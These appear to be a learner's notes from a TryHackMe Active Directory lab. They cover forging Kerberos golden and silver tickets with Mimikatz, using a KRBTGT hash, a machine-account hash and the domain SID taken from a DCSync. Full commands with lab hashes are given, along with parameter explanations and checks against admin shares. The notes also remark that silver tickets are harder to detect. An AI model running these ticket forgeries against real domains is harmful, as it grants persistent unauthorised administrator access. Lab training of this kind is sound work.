Forging Tickets for Fun and Profit: (this step is linked with DCSync)
After get infos from DCSync.

******** GOLDEN TICKET **********

We will need the NTLM hash of the KRBTGT account, which you should now have due to the DC Sync performed in the previous task. 
Furthermore, make a note of the NTLM hash associated with the THMSERVER1 machine account since we will need this one for our silver ticket. 
We can find this information in the DC dump that you performed. 
The last piece of information we need is the Domain SID. 
Using our low-privileged SSH terminal on THMWRK1, we can use the AD-RSAT cmdlet to recover this information:

    Winodws Victim CMD:
        powershell
    WE NEED DOMAIN SID via powershell CMD
        Get-ADDomain

    USE mimikatz:
        mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
        ex: -> kerberos::golden /admin:vfordAdmin /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt

        Parameters explained:

            /admin - The username we want to impersonate. This does not have to be a valid user.
            /domain - The FQDN of the domain we want to generate the ticket for.
            /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
            /sid -The SID of the domain we want to generate the ticket for.
            /krbtgt -The NTLM hash of the KRBTGT account.
            /endin - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
            /renewmax -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
            /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

    We can verify that the golden ticket is working by running the dir command against the domain controller:
        Terminal:
        za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>dir \\thmdc.za.tryhackme.loc\c$\



********* SILVER TICKET **********
Even if the golden ticket has an incredibly long time, the blue team can still defend against this by simply rotating the KRBTGT password twice. 
If we really want to dig in our roots, we want to generate silver tickets, 
which are less likely to be discovered and significantly harder to defend against since the passwords of every machine account must be rotated. 

We can use the following Mimikatz command to generate a silver ticket:
    Mimikatz Terminal:
        mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
            ex: kerberos::golden /admin:vfordAdminBCK /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
    
    Parameters explained:
        /admin - The username we want to impersonate. This does not have to be a valid user.
        /domain - The FQDN of the domain we want to generate the ticket for.
        /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
        /sid -The SID of the domain we want to generate the ticket for.
        /target - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.
        /rc4 - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.
        /service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
        /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

We can verify that the silver ticket is working by running the dir command against THMSERVER1:
    Terminal:
        dir \\thmserver1.za.tryhackme.loc\c$\

Now we have golden and silver tickets to the AD environment, providing better persistence than just credentials!
